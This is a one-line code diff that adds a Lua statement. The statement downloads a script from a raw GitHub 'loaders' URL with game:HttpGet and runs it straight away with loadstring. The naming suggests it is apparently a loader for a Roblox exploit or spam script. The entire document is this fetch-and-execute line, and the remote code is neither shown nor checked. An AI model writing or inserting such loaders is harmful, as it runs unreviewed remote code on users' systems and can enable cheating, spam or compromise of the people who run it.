@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/deltarune-fight-expanded-spam2-b31tv5i4jflhph.lua"))()
